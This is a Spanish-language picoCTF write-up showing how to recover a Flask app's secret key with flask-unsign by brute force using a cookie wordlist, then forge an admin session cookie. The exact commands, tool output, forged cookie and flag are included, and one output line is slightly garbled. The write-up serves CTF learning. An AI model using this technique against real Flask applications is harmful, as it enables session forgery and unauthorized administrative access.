## Objetivo
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/)

## Solución
Intentamos con la cookie recomendada y funciona pero no da la flag.
nos da una cookie de sesion la tomamos y llevamos a jwt
Revisamos el server.py y notamos que hay una lsita con las cookies, las guardamos como una wordlist (con su formato debido) 
utilizamos el comando
flask-unsign -u --server "http://mercury.picoctf.net:44693/" --wordlist wordlistcookies.txt
que nos da:
```
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZvxV7Q.nFxs79gniLvqhNzlu4HC4kqEnEY
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
```


ahora generamos la cookie para admin con:
flask-unsign -s --cookie "{'very_auth': 'admin'}" -S butter

nos da:
`eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZvxUtw.G-_3G1ZgUfLyjglo6VcG5j_x0S0`
la utilizamos y:
`picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}`

## Notas Adicionales
Se debe hacer uso de una wordlist de cookies
Debemos instalar flask-unsign con pip: pip3 install flask-unsign

## Referencias
https://jwt.io/